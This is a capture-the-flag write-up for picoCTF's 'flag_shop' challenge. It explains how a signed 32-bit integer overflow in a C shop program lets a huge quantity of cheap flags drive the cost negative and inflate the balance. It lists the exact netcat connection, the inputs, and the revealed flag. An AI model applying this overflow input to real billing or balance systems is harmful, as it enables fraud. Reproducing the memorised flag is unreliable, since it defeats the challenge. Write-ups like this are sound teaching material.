# flag_shop – picoCTF Write-up

---

## Description

> There's a flag shop selling stuff. Can you buy a flag?  
> You're given the binary source of a C program and must connect via:
>
> `nc jupiter.challenges.picoctf.org 44566`
>
> **Hint:** "Two's complement can do some weird things when numbers get really big!"

---

## Solution

You start with **$1100**, and the real flag costs **$100,000**, which seems impossible.  
But there's a **cheaper item**: fake flags that cost **$900 each**. This is where the vulnerability lies.

Looking at the source code:
```c
int total_cost = 0;
total_cost = 900 * number_flags;
if(total_cost <= account_balance) {
    account_balance = account_balance - total_cost;
}
```

The variable `total_cost` is a signed 32-bit integer. This means we can exploit it with an **integer overflow**.

---

### Understanding the Overflow

The max value of a signed 32-bit integer is:
```
2147483647
```

To make `total_cost` overflow, we calculate:
```
2147483647 / 900 ≈ 2386092
```

So, if we enter any number **greater than 2386092**, the result of `900 * number_flags` will overflow into a **negative number**.

This tricks the program into **subtracting a negative number**, effectively increasing your balance to a very high number.

---

## Exploit Steps

### Step 1: Connect
```bash
nc jupiter.challenges.picoctf.org 44566
```

---

### Step 2: Overflow the Balance

Input:
```
2               ← Buy Flags
1               ← Choose “Definitely not the flag Flag”
2400000         ← Enter quantity to trigger overflow
```

Expected Output:
```
The final cost is: -X
Your current balance after transaction: 214748XXX
```

✅ You now have billions of dollars.

---

### Step 3: Buy the Real Flag

Input:
```
2               ← Buy Flags
2               ← Choose “1337 Flag”
1               ← Confirm purchase
```

Output:
```
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
```

---

